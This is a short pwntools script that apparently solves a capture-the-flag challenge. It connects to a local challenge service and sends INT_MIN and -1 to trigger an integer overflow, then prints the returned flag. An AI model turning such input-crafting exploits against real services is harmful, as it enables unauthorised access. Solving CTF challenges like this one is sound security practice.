#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(os='linux', arch='amd64')

BINARY = './problem'
REMOTE = True
INT_MIN = 0x80000000


def exploit():
    if REMOTE:
        r = remote('127.0.0.1', 41892)
    else:
        r = process(BINARY)

    r.recvline()
    r.recvline()
    r.sendline(str(INT_MIN))
    r.sendline(str(-1))
    r.recvline()

    print 'Flag:', r.recvline()


if __name__ == '__main__':
    exploit()

